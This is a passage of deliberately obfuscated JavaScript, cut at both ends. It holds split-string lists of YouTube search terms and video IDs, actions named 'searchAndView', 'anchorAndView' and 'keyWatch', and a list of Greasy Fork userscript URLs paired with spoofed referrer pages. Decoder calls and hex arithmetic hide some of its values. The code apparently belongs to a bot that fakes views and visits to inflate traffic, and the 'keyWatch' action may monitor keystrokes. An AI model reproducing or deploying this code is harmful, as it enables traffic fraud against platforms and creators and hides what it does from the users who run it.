'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1310 + -0xae3 + -0x823)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xe9b + 0xb2 * -0xb + 0x164b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x64 * -0x27 + -0xb92 * 0x3 + 0x137d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    X(0x6) + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    W(0x10) + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    W(0xa) + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    X(0x16) + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    W(0x5) + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    W(0x1c) + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0xb, 'L(WI') + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + X(0xc) + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + W(0x1d)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x3) + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + Y(0x19, 'DrrL') + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
